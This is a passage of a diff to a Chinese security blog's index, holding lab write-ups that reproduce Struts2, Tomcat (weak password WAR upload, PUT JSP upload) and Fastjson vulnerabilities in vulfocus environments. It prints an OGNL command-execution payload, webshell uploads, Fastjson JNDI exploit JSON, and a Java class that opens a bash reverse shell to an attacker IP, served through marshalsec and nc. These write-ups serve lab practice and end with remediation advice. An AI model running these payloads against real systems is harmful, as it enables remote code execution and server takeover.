 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081417.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081417.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-devMode CVE-2016-4438复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081418.png" alt="image"></p>
+</li>
+<li><p>直接使用工具获得flag<br><img src="https://qiniu.hzktester.top/tp2020081419.png" alt="image"></p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2322,20 +2322,20 @@
 <h2 id="知识点：什么是war包"><a href="#知识点：什么是war包" class="headerlink" title="知识点：什么是war包"></a>知识点：什么是war包</h2><p>war 包是一种打包格式<br>Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。<br>war 包的结构（是一个web 项目编译后的结果）</p>
 <a id="more"></a>
 <h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
-<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081201.png" alt="image"></p>
+<li><p>使用vulfocus启动漏洞环境<br> <img src="https://qiniu.hzktester.top/tp2020081201.png" alt="image"></p>
 </li>
-<li><p>访问漏洞环境，点击“Manager App”<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081202.png" alt="image"></p>
+<li><p>访问漏洞环境，点击“Manager App”<br> <img src="https://qiniu.hzktester.top/tp2020081202.png" alt="image"></p>
 </li>
 <li><p>弱口令登录，账号tomcat，密码tomcat</p>
-<p> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081203.png" alt="image"></p>
+<p> <img src="https://qiniu.hzktester.top/tp2020081203.png" alt="image"></p>
 </li>
 <li><p>把jsp木马解压为zip压缩文件，改后缀名为war</p>
 </li>
-<li><p>上传war包<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081204.png" alt="image"></p>
+<li><p>上传war包<br> <img src="https://qiniu.hzktester.top/tp2020081204.png" alt="image"></p>
 </li>
-<li><p>部署war包之后，war包会在当前路径下解压。<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081205.png" alt="image"></p>
+<li><p>部署war包之后，war包会在当前路径下解压。<br> <img src="https://qiniu.hzktester.top/tp2020081205.png" alt="image"></p>
 </li>
-<li><p>访问路径是 /war (war包路径) /XXX.jsp（你的 webshell），拿到flag<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081206.png" alt="image"></p>
+<li><p>访问路径是 /war (war包路径) /XXX.jsp（你的 webshell），拿到flag<br> <img src="https://qiniu.hzktester.top/tp2020081206.png" alt="image"></p>
 </li>
 </ol>
 ]]></content>
@@ -2353,17 +2353,17 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
 <a id="more"></a>
 <h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
-<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081101.png" alt="image"></p>
+<li><p>使用vulfocus启动漏洞环境<br> <img src="https://qiniu.hzktester.top/tp2020081101.png" alt="image"></p>
 </li>
-<li><p>访问页面如下：<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081102.png" alt="image"></p>
+<li><p>访问页面如下：<br> <img src="https://qiniu.hzktester.top/tp2020081102.png" alt="image"></p>
 </li>
-<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081103.png" alt="image"></p>
+<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="https://qiniu.hzktester.top/tp2020081103.png" alt="image"></p>
 </li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko&#x2F;20100101 Firefox&#x2F;76.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 60577</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
 
 <ol start="4">
-<li>直接访问上传的木马文件，拿到flag<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081103.png" alt="image"></li>
+<li>直接访问上传的木马文件，拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081103.png" alt="image"></li>
 </ol>
 ]]></content>
       <categories>
@@ -2384,13 +2384,13 @@
 <li>搭建vulfocus漏洞环境</li>
 <li>启动“vulfocus/fastjson-cnvd_2017_02833”</li>
 </ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080801.png" alt="image"><br>3. 访问页面显示如下说明环境正常<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080802.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080801.png" alt="image"><br>3. 访问页面显示如下说明环境正常<br><img src="https://qiniu.hzktester.top/tp2020080802.png" alt="image"></p>
 <h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
 <p>构造请求如下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.130:59541</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
 <p>其他回显方式：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080803.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080803.png" alt="image"></p>
 <h3 id="fastjson1-2-47以下版本通杀poc："><a href="#fastjson1-2-47以下版本通杀poc：" class="headerlink" title="fastjson1.2.47以下版本通杀poc："></a>fastjson1.2.47以下版本通杀poc：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;f&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;asdfasfd&#x2F;&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">age:11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>其中{“@type”:”com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”:”ldap://asdfasfd/“, “autoCommit”:true}也可以替换成其他利用链</p>
@@ -2398,9 +2398,9 @@
 <h3 id="攻击机环境配置"><a href="#攻击机环境配置" class="headerlink" title="攻击机环境配置"></a>攻击机环境配置</h3><h4 id="centos7服务器，可通外网"><a href="#centos7服务器，可通外网" class="headerlink" title="centos7服务器，可通外网"></a>centos7服务器，可通外网</h4><ol>
 <li><p>修改 java 恶意类代码保存为 TouchFile.java</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">   static &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">          Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">          Process p &#x3D; r.exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;1888 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">          p.waitFor();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           &#x2F;&#x2F; do nothing</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> 将恶意java代码上传到攻击机，并使用javac编译（需安装jdk1.8并配置环境变量）<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080804.png" alt="image"></p>
+<p> 将恶意java代码上传到攻击机，并使用javac编译（需安装jdk1.8并配置环境变量）<br> <img src="https://qiniu.hzktester.top/tp2020080804.png" alt="image"></p>
 </li>
-<li><p>使用 python -m SimpleHTTPServer 快速搭建http服务<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080805.png" alt="image"><br> 访问ip+1111端口号，证明http服务搭建正确<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080806.png" alt="image"><br> 服务器收到响应<br> <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080807.png" alt="image"></p>
+<li><p>使用 python -m SimpleHTTPServer 快速搭建http服务<br> <img src="https://qiniu.hzktester.top/tp2020080805.png" alt="image"><br> 访问ip+1111端口号，证明http服务搭建正确<br> <img src="https://qiniu.hzktester.top/tp2020080806.png" alt="image"><br> 服务器收到响应<br> <img src="https://qiniu.hzktester.top/tp2020080807.png" alt="image"></p>
 </li>
 <li><p>开启ldap服务</p>
 <ul>
@@ -2409,17 +2409,17 @@
 <li><p>使用<strong>marshalsec</strong>开启ldap服务</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:1111&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080808.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080808.png" alt="image"></p>
 </li>
 <li><p>nc监听1888端口</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080809.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080809.png" alt="image"></p>
 </li>
 </ul>
 </li>
 <li><p>构造payload发送请求</p>
 </li>
 </ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080810.png" alt="image"><br>5. ldap服务收到请求<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080811.png" alt="image"><br>6. 监听的1888端口成功反弹shell，拿到flag<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080812.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080810.png" alt="image"><br>5. ldap服务收到请求<br><img src="https://qiniu.hzktester.top/tp2020080811.png" alt="image"><br>6. 监听的1888端口成功反弹shell，拿到flag<br><img src="https://qiniu.hzktester.top/tp2020080812.png" alt="image"></p>
 <h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
 <li>升级Fastjson到最新版</li>
 <li>WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \u0040type, \x04type等多种编码的autotype变形</li>
